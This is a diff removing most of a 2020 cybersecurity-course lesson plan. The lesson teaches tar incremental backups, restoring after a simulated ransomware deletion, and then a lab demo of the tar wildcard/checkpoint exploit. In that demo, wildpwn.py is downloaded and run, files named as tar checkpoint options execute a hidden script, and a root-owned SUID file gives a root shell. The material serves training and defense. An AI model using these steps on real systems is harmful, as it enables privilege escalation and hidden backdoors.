-    - `sudo -tar cvvWf emerg_back_mon.tar --listed-incremental=emerg_backup.snar emergency`
-
-- Run the command to add a new file in the `emergency/admit` directory:
-
-     `echo "New file for CJones" > emergency/admit/file6.txt`
-
-
-    - **Note:** Be sure to `exit` **sudo su** if you used it then run the following commands to verify the new file has been added:
-
-    - Re-run the incremental back to add the new file to the archive:
-
-      - `sudo -tar cvvWf emerg_back_mon.tar --listed-incremental=emerg_backup.snar emergency`
-
-    - Next, let's verify that the new file has been added and observing the **Y** flag for `file6.txt`. 
-    - `File1.txt` through `file5.txt` should have an **N** flag set because those files were present in the directory at the time the archive was re-created:
-
-      - `tar tvvf emerg_back_mon.tar --incremental`
-
-    ```
-    drwxr-xr-x  instructor/instructor   29  2019-07-04  03:28   emergency/admit/
-
-    N file1
-    N file3
-    N file4
-    N file5
-    Y file6       
-    ```
-
-Note the following:
-
-- `--level=0` option is not used in the command. `tar` sees this as an incremental backup, not a full backup, because a snapshot file has already been created.
-
-- Only `file6.txt` was added to the Monday `emerg_back_mon.tar` file. This keeps the `tar` file very small.
-
-Next, we will simulate the updating of an existing file in the `discharge` directory. This change was made on Tuesday.
-
-- Run:
-
-    - `echo "Update MSmith" >> emergency/discharge/file2.txt`
-
-    - `tar cvvWf emerg_back_tues.tar --listed-incremental=emerg_backup.snar emergency`
-
-    - `tar tvvf emerg_back_tues.tar --incremental`
-
-Output should look like:
-
-      ```
-      drwxr-xr-x sysadmin/sysadmin 29 2020-06-10 08:44 emergency/
-      N .gitkeep
-      D admit
-      D discharge
-
-      drwxr-xr-x sysadmin/sysadmin 56 2020-06-11 15:51 emergency/admit/
-      N file1.txt
-      N file3.txt
-      N file4.txt
-      N file5.txt
-      N file6.txt
-
-      drwxr-xr-x sysadmin/sysadmin 12 2020-06-10 08:44 emergency/discharge/
-      Y file2.txt
-
-      -rw-r--r-- sysadmin/sysadmin 355 2020-06-11 15:57 emergency/discharge/file2.txt
-      ```
-
-- Only the updated file is added to the `emerg_back_tues.tar` file.
-
- Review the incremental files that have been created in the `$HOME/Documents/epscript` directory.
-
-* Run `ls -l *.tar`
-
-* The output from this command shows the files that were created:
-
-    ```
-    emerg_back_sun.tar
-    emerg_back_mon.tar
-    emerg_back_tues.tar
-    ```
-
-We will now simulate Wednesday's ransomware attack on the hospital by removing the `emergency` directory.  
-Though instead of actually removing, we will simply rename it.  That way we can repeat the demo if we wish.  Or if we make a mistake, we can easily recover the emergency directory
-
-- Run the following commands:
-
-    `mv emergency emergency_deleted`  
-    `ls`
-
-We can restore the directory by first extracting the files from the full backup from Sunday, followed by the incremental backups from Monday and Tuesday.
-
-- The following `tar` command extracts the files from the archives:
-
-    - `tar xvvf emerg_back_sun.tar --incremental`
-
-        - `x` extracts the files from the archive.
-        - `vv` displays a full file specification.
-        - `f` stands for _use this archive file_.  This option must be present.
-        - `emerg_back_sun.tar` is the archive to use.
-        - `--incremental` indicates that this is an incremental backup.
-
-    - The snapshot file is not needed in the command since all the metadata, or, information necessary for extraction, is stored in the archive.
-
-In our `$HOME/Documents/epscript` directory, we run the following commands to restore the `emergency` directory:
-
-- First, apply the Sunday level 0 backup.
-
-    - Run `tar xvvf emerg_back_sun.tar --incremental`
-
-- What files are in the emergency directory now?
-
-    - The directory contains only the original files in the `admit` and `discharge` directories.
-
-- Run the `ls` command to display the current files in the `emergency` directory and all of its subdirectories:
-
-    `ls -R emergency`
-
-- We'll now apply Monday's incremental backup.
-
-    - Run `tar xvvf emerg_back_mon.tar --incremental`
-
-- What files are in the `emergency` directory now?
-
-
-    - The directory now also contains the `file6.txt` file we added on Monday.
-
-
-        - Run `ls -R emergency` to confirm.
-
-- We'll show the `emergency/discharge/file2.txt` file before applying the Tuesday incremental backup, so that we can see the state of the file before we update with Tuesday's file.  
-
-- Run `cat emergency/discharge/file2.txt`
-
-Next, we'll apply Tuesday's incremental backup.
-
-- Run `tar xvvf emerg_back_tues.tar --incremental`
-
-What is the state of the file now?
-
- - The `file2.txt` file contains the line we added for the Tuesday incremental backup.
-
-- Run `cat emergency/discharge/file2.txt` to see the new output. 
-
-We have restored the files in the `emergency` directory to the state before the malware attack.   
-
-### 09. Break
-
-### 10. Activity: Restoring Data with Incremental Backups
-
-- [Activity File: Restoring Data with Incremental Backups](Activities/10_Incremental_Restore/Unsolved/README.md)
-
-
-### 11. Activity Review: Restoring Data with Incremental Backups
-
-- [Solution Guide: Restoring Data with Incremental Backups](Activities/10_Incremental_Restore/Solved/README.md)
-
-
-### 12. Exploiting the `tar` Command with the Checkpoint and Wildcard Options
-
-
-In the previous sections, we learned how `tar` can be used to create full and incremental backups, and how we can extract files and directories from these backups.
-
-In this last section, we’ll look at how the `tar` command can be used by hackers to plant malware on a system.
-
-- This involves a combination of using the wildcard character and a feature known as _checkpoints_ with `tar`.
-
-
-- The wildcard character `*` can be used to specify multiple files in a directory without having to type each filename.
-
-
-- Wildcard characters in shell commands are expanded to matching filenames before the command is actually executed.
-
-We’ll first show how wildcards are used with `tar`.
-
-#### Using Wildcards with `tar`
-
-We've used the wildcard character `*` before when creating an archive.
-
-- Rather than individually type each file that needs to be included in a full backup, we can use the wildcard character to indicate multiple files and directories.
-
-- It is not necessary to use wildcards with tar, but since they save us time potentially prevent mistyping file names, they are commonly used.
-
-For example, if we have a directory called `Documents` that contains the nine files listed below, we can run the following command to create an archive that contains all of them, without having to type the name of each individual file.
-
-Run the following commands: 
-
-- `cd ~/Documents/ExploitTar` to navigate to a folder that we want to archive:
-
-- `ls` to show its contents:
-
-    ```
-    f1   f10   f2   f3   f4   f5   f6   f7   f8   f9  'important docs'
-    ```
-
-- `tar cvf archive.tar ./*` to archive all files in the current directory using an asterisk `*`, the wildcard character.
-
-- Note: wildcards can be used more cautiously.  We could also run `tar cvf archive.tar ./f* "important docs"`.  This ensures that we're not blindly archiving everything in the current directory.  
-
-- `ls` again to show the new `archive.tar` file:
-
-    ```
-    archive.tar   f10   f3   f5   f7   f9
-    f1            f2    f4   f6   f8  'important docs'
-    ```
-
-
-As we'll see, wildcards can be used by hackers to exploit `tar`. 
-
-#### Checkpoints
-
-- A checkpoint is the point in time at which the *nth* file is being archived (or extracted).  We provide each checkpoint with the value for *n*, as we'll see below.
-
-- Two examples of checkpoints:
-
-    - A checkpoint triggers an action to run once the backup reaches 1000 files. This action prints the remaining disk space to the screen.
-
-    - When restoring files from a remote site, a checkpoint triggers an action which prints the number of bytes transferred every 5000 files.
-
-- Using checkpoints with `tar` is best practice, as it helps administrators avoid serious issues, such as accidentally using up all of the space on a backup server, or slowing down the network, both of which can threaten data availability.
-
-Checkpoints require two options.  The first defines the checkpoint (*n*), and the second defines the action.
-
-Use the following example to detail the syntax of the checkpoint command:
-
- `--checkpoint=1000` and  `--checkpoint-action=du`
-
-- `--checkpoint=1000` indicates how often the checkpoint occurs. At every thousandth file, an action will take place.
-
-- `--checkpoint-action=du` specifies the action for the given checkpoint. In this case, the action displays available disk space.
-
-The general syntax of checkpoint commands is:
-
- `--checkpoint=[n]` and `--checkpoint-action=[ACTION]`
-
-Next, we show how a hacker can exploit a system vulnerability:
-
-- In our previous Linux unit, we learned why system administrators must harden a system against attacks.
-
-
-- Once hackers find a weakness in a system, they exploit that weakness by changing existing code or uploading and running their own code.  The latter of which is **arbitrary command execution**, or **ACE**.
-
-- ACE vulnerabilities are extremely dangerous, because attackers can exploit them to accomplish almost anything.  The ultimate goal is gaining root access to the machine, at which point the hacker "owns" the machine.
-
-- For our current example, hackers have discovered how to use the `tar` checkpoint option with a wildcard to plant malicious code on a system, which they can later run to gain root privileges on the machine.
-
-
-### Using Checkpoints and Wildcards to Exploit a System
-
-Hackers can exploit `tar` using the following steps:
-
-- A hacker gains access to the system by impersonating a normal user. This can happen if a hacker is, for example, able to get that user’s password.
-
-    - A normal user cannot access sensitive files, open network connections, or perform other actions that require root privileges.
-
-
-    - But a normal user is typically able to download and execute files from the internet.
-
-    - A hacker can exploit this by downloading and executing malicious files.
-
-- Today, we’ll see how hackers can use `wildpwn.py`, a Python file that is readily available on the  web, to exploit `tar` and gain root privileges.
-
-    - Downloading and running `wildpwn.py` will create malicious files in that normal user’s home directory.
-
-    - Specifically, `wildpwn.py` will plant three malicious files on the system: one hidden malicious script, and two other files that are disguised as `tar` checkpoint options.
-
-- When an unsuspecting administrator with root privileges runs the `tar` command with the wildcard option to create an archive containing this directory, `tar` will execute this malicious script.
-
-
-    - The script, in turn, will use the administrator’s root privileges to create malware on the system.
-
-    - The hacker will later use this malware to drop into a root shell, granting root access to the system.
-
-It's okay if you're a little confused at this point. We’ll dive into the specifics of `wildpwn.py` and further explain this exploit.
-
-- When a hacker runs `wildpwn.py`, it creates three files. The script will create these files even if the hacker only has normal user privileges. The files that are created are a malicious hidden script called `.webscript` and two files disguised as `tar` checkpoint options.
-
-- The checkpoint files look like this:
-
-    - `--checkpoint=1`
-
-    - `--checkpoint-action=exec=sh .webscript`
-
-- `--checkpoint=1` tells `tar` to execute the checkpoint action after adding the first file to the archive. In other words, these checkpoint files will cause `tar` to execute the malicious `.webscript` almost immediately.
-
-- When an unsuspecting system administrator runs `tar`, the system will mistakenly interpret the above filenames as checkpoint options, and those "options" will cause `tar` to execute `.webscript`.
-
-- If an administrator runs this command with root privileges, i.e. `sudo tar...`, the malicious `.webscript` will run with root privileges as well — meaning it can do anything to the system!
-
-- When `.webscript` is run with root privileges, it creates a hidden folder named `.cache`, and a hidden file named `.cachefile` inside of `.cache`.  `.cachefile` is a malicious program that the hacker can later run to open a root shell.
-
-
-
-- Leaving the final malware in a hidden directory called `.cache`, within a hidden file called `.cachefile`, is a very subtle and stealthy deployment method. The administrator will probably have no idea that the file has been created, and will not see either the `.cache` directory or the `.cachefile` unless they list all files with the `-a` flag.
-
-The hacker cannot simply run `.webscript`, as the script require root privileges.  So the hacker needs a user with root privileges, i.e. a system administrator to run it. 
-
-
-
-#### Exploiting `tar` Demo
-
-We'll use the following scenario:
-
-- A hacker has gained access to our system by stealing the password for the instructor user.
-
-
-- For this example we pretend that instructor user does not have root access, but in your activity you will truly be working with a user who does not have root access.
-
-- We will pretend to be the hacker and use `wildpwn.py` to plant malicious files. These files will be executed when an administrator with root privileges runs the tar command.
-
-
-Open up a terminal and run the following commands:
-
-- Create a new directory for this demonstration: `mkdir ~/Documents/exploit_demo`
-
-- Move to the `exploit_demo` directory with: 
-
-    -  `cd /Documents/exploit_demo`
-
-    - This is the directory to which the hacker would download the `wildpwn.py` program.
-
-Download the script with `wget`.
-
-- Then, run `ls -l` to show that the `wildpwn.py` program is in this directory.
-
-     
-    - `wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py`
-
-    - `ls -l`
-     
-    ```
-     -rw-r--r--   1 instructor  instructor   3.6K Dec 19 12:46 wildpwn.py
-    ```
-
-Type  `python wildpwn.py tar .` This will create both the malicious script and checkpoint files.
-
-- Syntax breakdown:
-
-    - `python` is used to run Python programs.
-    - `wildpwn.py` is the program we’re executing.
-    - `tar` tells `wildpwn.py` to create malicious files that will exploit the `tar` command. This is necessary because `wildpwn.py` can exploit other commands as well.
-    - The `.` specifies that these files should be created in the current directory.
-
-- Run the command and show the output:
-
-    - `python wildpwn.py tar .`
-    ```  
-    [!] selected payload tar
-
-    [*] Done! Now wait for something like: archive.tar * on . Good Luck!
-    ```
-
-Running `wildpwn.py` has successfully planted all the files needed for an attacker to exploit the system. These malicious files will be executed as soon as an administrator creates a `tar` archive containing them.
-
-You should see something similar in your exploit_demo directory:
-
-- Run `ls -alh`
-
-drwxr-xr-x  2 sysadmin sysadmin 4096 Jun 11 19:16  ./
-drwxr-xr-x 17 sysadmin sysadmin 4096 Jun 11 19:16  ../
--rw-r--r--  1 sysadmin sysadmin    0 Jun 11 19:16 '--checkpoint=1'
--rw-r--r--  1 sysadmin sysadmin    0 Jun 11 19:16 '--checkpoint-action=exec=sh .webscript'
--rw-r--r--  1 sysadmin sysadmin  535 Jun 11 19:16  .webscript
--rw-r--r--  1 sysadmin sysadmin 3699 Jun 11 19:16  wildpwn.py
-
-- These are files whose names look like `tar` options. Normal users would never use such filenames: this is something that only hackers would do. 
-
-What do you think the file `--checkpoint-action=exec=sh .webscript` will do when it’s interpreted as a checkpoint command?
-
-  - When an administrator uses `tar` to create an archive containing this file, it will cause `tar` to run the program `.webscript` as a checkpoint action. Note that the period `.` before `webscript` indicates that it is a hidden file. It can only be displayed using the `-a` option with `ls`. 
-
-- Let's archive this directory to activate the script.
-
-- Remember, we need a user with root privileges to run the `tar` command and archive the directory which contains the malicious files.
-
-
-Now, use `tar` with a wildcard to create an archive and generate the malicious files: 
-
-- `sudo tar cf archive.tar *`
-
-    - Note that this command is run from _inside_ the directory where `.webscript` is located. If it were run elsewhere, the backdoor would not be generated.
-
-    - Getting this exploit to work obviously requires that the system administrator create the archive from the folder that contains `.webscript`. Common targets, i.e. good places to hide such malware are `/tmp`, users' home directories, and users' `Documents` directories, as these are often backed up.
-
-Let's examine the directory now, after the `tar` command was run.
-
-- Show how the directory listing has changed. The .webscript file “cleans up”, removing itself and the two malicious faux checkpoint files, in addition to creating hidden malicious files.
-
-- It would be really helpful to look at the code of .webscript. There are many familiar commands that you should understand. Specifically, you can see the “clean up” commands.
-
-Notice the SUID part!!!!! This is just as important as root:root ownership!!!
-
-- Run: `ls -la`
-    ```
-     drwxrwxr-x 3 instructor instructor  4096 Apr 28 19:53 .
-    -rw-r--r-- 1 root       root       10240 Apr 28 19:53 archive.tar
-    drwxr-xr-x 2 root       root        4096 Apr 28 19:53 .cache
-    -rw-rw-r-- 1 instructor instructor  3699 Apr 28 19:50 wildpwn.py
-    drwxr-xr-x 5 instructor instructor  4096 Apr 28 19:49 ..
-    ```
-
-Note the following about this output:
-
-- There is a new directory called `.cache` that we will explore in just a moment.
-
-- The three malicious files have been disappeared!  On your own, examine the `.webscript` file (you can run wildpwn.py again to download the `.webscript` again) to find out how it "cleans up after itself."  Hackers often hide their tracks... 
-
-Move into the new `.cache` directory and list the files located inside.
-
-- `cd .cache`
-
-      ```
-      total 20
-      drwxr-xr-x 2 root       root       4096 Jan  3 13:54 .
-      drwxr-xr-x 8 instructor instructor 4096 Jan  6 10:50 ..
-      -rwsr-xr-x 1 root       root       8392 Jan  3 13:54 .cachefile
-      ```
-
-
-There is just one file located here, called `.cachefile`, and it is executable.
-Not only is it executable by owner, group, and other, but the SUID bit is also set!  Whoever runs this script will have their permissions elevated to root!
-
-- Run: `./.cachefile` to execute it.
-
-- Note: this file's owner and group are root:root.  We are able to execute it only because the execute permission is set for owner, group, AND other.  This is a good example of how executable permissions should be cautiously granted!
-
-The change in user prompt from `instructor` to `root` that shows we now have root access.
-
-- The `.cachefile` that we ran was owned by `root`, which is why running the script is able to give us root privileges.
-
-
-- `.cachefile` is owned by the root user because we ran the archive command with `sudo tar...` not just `tar...`. If we didn't prefix the command with `sudo`, the `.cachefile` wouldn't do anything (specifically, it would change our user to instructor instead of `root`, which is useless to a hacker).  Furthermore, the SUID bit is set!
-
-
-* In practice, an administrator would not manually run `sudo tar ...` to back up a directory.
-
-    - Instead, the system use `cron` to run an automated backup on a set schedule, such as every Friday, and would do so with root privileges. This is because it needs to archive files belonging to every user, and the only user who has permissions to modify everyone's files is `root`.
-
-This is great for a hacker because if the system administrator schedules regular backups, and uses the wildcard character, it's likely that these malicious files will be included in a backup.
-
-- The hacker can then simply wait until this happens, and then have a method to gain access to the `root` account.
-
-- In the next exercise, you will log in as an unprivileged user without `sudo` rights, run the exploit to generate the malicious files, and find a `.cachefile` owned by `root` that allows you to escalate privileges.
-
--On your own,  download and run the malicious python script again.  Examine carefully the contents of `.webscript`.  Look for clues as to how the permissions and SUID were set.  What else do you discover?  What kind of file is `.cachefile`, most likely.  Hint: Google is your friend!
-
-### 13. Activity: Exploiting `tar`  
-
-- [Activity File: Exploiting `tar`](Activities/13_Exploiting_Tar/Unsolved/README.md)
-
-### 14. Activity Review: Exploiting `tar`
-
-- [Solution Guide: Exploiting `tar`](Activities/13_Exploiting_Tar/Solved/README.md)
-
----
-#### Copyright
-
-© 2020 Trilogy Education Services, a 2U, Inc. brand.  All Rights Reserved.
+© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.
